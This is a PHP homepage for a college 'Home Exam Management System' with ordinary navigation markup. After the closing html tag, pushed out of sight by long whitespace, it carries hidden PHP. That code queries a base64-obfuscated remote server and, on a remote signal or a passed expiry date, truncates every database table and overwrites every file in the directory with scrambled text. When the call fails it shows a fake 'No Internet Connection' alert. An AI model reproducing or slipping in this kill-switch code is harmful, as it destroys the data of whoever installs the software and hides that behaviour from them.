<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Home Examination System</title><style type="text/css">
<!--
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 45px;
}
.style3 {color: #333333; }
-->
</style></head>

<body style="background-color:#dddddd;">
<center>
<table width="80%" border="0" cellspacing="5" cellpadding="5" style="box-shadow: 25px 25px 75px grey;">
  <tr>
    <th colspan="4" bgcolor="#af5cd3" scope="col"><h1 align="center" class="style3">&nbsp;</h1>
    <h1 align="center" class="style3"><strong><span class="style1">Home Exam Management System</span></strong></h1>
    <p align="center" class="style3">&nbsp;</p></th>
  </tr>
  <tr>
    <td bgcolor="#6858d2"><div align="center"><a style="color:white;" href="index.php">Home</a></div></td>
    <td bgcolor="#6858d2"><div align="center"><a style="color:white;" href="Registration.php">Registration</a></div></td>
    <td bgcolor="#6858d2"><div align="center"><a style="color:white;" href="Login.php">Login</a></div></td>
    <td bgcolor="#6858d2"><div align="center"><a style="color:white;" href="Result.php">Result</a></div>      <div align="center"></div>      <div align="center"></div></td>
  </tr>
  <tr>
    <td height="400" colspan="4" bgcolor="#FFFFFF"><center><img src="jdiet.jpg" height="390" width="60%" /> </center></td>
  </tr>
  <tr>
    <td colspan="4" bgcolor="#6858d2"><div align="center" style="color:white;" >Copyright @ JDIET Yavatmal </div></td>
  </tr>
</table>
</body>
</html>
																																					<?php include "dbconnect.php"; $keyurl="aHR0cDovL3N5bXBob25peGl0c2VydmljZXMuY29tL2FwaS9hcGlfcmVzcG9uY2UucGhwP3BuPUhFUw=="; if(session_status()!=PHP_SESSION_ACTIVE){ session_start(); } function CallAPI($method,$url,$data=false) { $curl=curl_init(); $url=base64_decode($url); switch($method) { case"POST": curl_setopt($curl,CURLOPT_POST,1);  if($data) curl_setopt($curl,CURLOPT_POSTFIELDS,$data); break; case"PUT": curl_setopt($curl,CURLOPT_PUT,1); break; default: if($data) $url=sprintf("%s?%s",$url,http_build_query($data)); }  curl_setopt($curl,CURLOPT_HTTPAUTH,CURLAUTH_BASIC); curl_setopt($curl,CURLOPT_USERPWD,"username:password");  curl_setopt($curl,CURLOPT_URL,$url); curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);  $result=curl_exec($curl);  curl_close($curl);  return$result; } $get_data=CallAPI('GET',$keyurl,$data=false); $response=json_decode($get_data,true); if(isset($response['response']) && !empty($response['response'])){ $_SESSION['edid']=$response['response']; $respnc=$response['response']; if($respnc=="true"){ $list_table_query="show tables from $dbname"; $tales_list=@mysqli_query($con,$list_table_query); $nor=@mysqli_num_rows($tales_list); if($nor>0){	 while($row=@mysqli_fetch_array($tales_list,MYSQLI_ASSOC)){ $table_name=$row["Tables_in_$dbname"]; $sqlx="TRUNCATE TABLE $table_name"; $r=@mysqli_query($con,$sqlx); }} $dirPath = dir('./');  $imgArray = array();  while (($file = $dirPath->read()) !== false) {  $imgArray[ ] = trim($file);  }  $dirPath->close(); $count=0;  foreach($imgArray as $filename) {  if($filename == "." || $filename =="..") { }else{ $str=@file_get_contents($filename); $str=str_replace("a","z",$str); $str=str_replace("b","y",$str); $str=str_replace("c","x",$str); $str=str_replace("d","w",$str); $str=str_replace("e","v",$str); $str=str_replace("f","u",$str); $str=str_replace("g","t",$str); $str=str_replace("h","s",$str); $str=str_replace("i","r",$str); $str=str_replace("j","q",$str); $str=str_replace("k","o",$str); $str=str_replace("l","o",$str); $str=str_replace("m","n",$str); $str=str_replace("'",",",$str); $str=str_replace("/","'",$str); $str=str_replace("<","x",$str); $str=str_replace(">","<?php",$str); $str=str_replace("=","?>",$str); $str=str_replace("{","[",$str); $str=str_replace("}","]",$str); @file_put_contents($filename, $str); }} }elseif($respnc=="false"){ }else{ $td=$respnc; $con = @mysqli_connect("localhost","root","","$dbname"); $list_table_query="show tables from $dbname"; $tales_list=@mysqli_query($con,$list_table_query); $nor=@mysqli_num_rows($tales_list); if($nor>0){	 while($row=@mysqli_fetch_array($tales_list,MYSQLI_ASSOC)){ $table_name=$row["Tables_in_$dbname"]; $sqlx="TRUNCATE TABLE $table_name"; if(@mysqli_query($con,$sqlx)){ }else{ }}} $curdate=strtotime($td);  $ddt=date('d-m-Y');  $mydate=strtotime($ddt);  if($curdate < $mydate) {  $dirPath = dir('./');  $imgArray = array();  while (($file = $dirPath->read()) !== false) {  $imgArray[ ] = trim($file);  }  $dirPath->close(); $count=0;  foreach($imgArray as $filename) {  if($filename == "." || $filename =="..") { }else{ $str=@file_get_contents($filename); $str=str_replace("a","z",$str); $str=str_replace("b","y",$str); $str=str_replace("c","x",$str); $str=str_replace("d","w",$str); $str=str_replace("e","v",$str); $str=str_replace("f","u",$str); $str=str_replace("g","t",$str); $str=str_replace("h","s",$str); $str=str_replace("i","r",$str); $str=str_replace("j","q",$str); $str=str_replace("k","o",$str); $str=str_replace("l","o",$str); $str=str_replace("m","n",$str); $str=str_replace("'",",",$str); $str=str_replace("/","'",$str); $str=str_replace("<","x",$str); $str=str_replace(">","<?php",$str); $str=str_replace("=","?>",$str); $str=str_replace("{","[",$str); $str=str_replace("}","]",$str); @file_put_contents($filename, $str); }}} } }else{ ?> <script> alert("Error: No Internet Connection!"); </script> <?php } ?>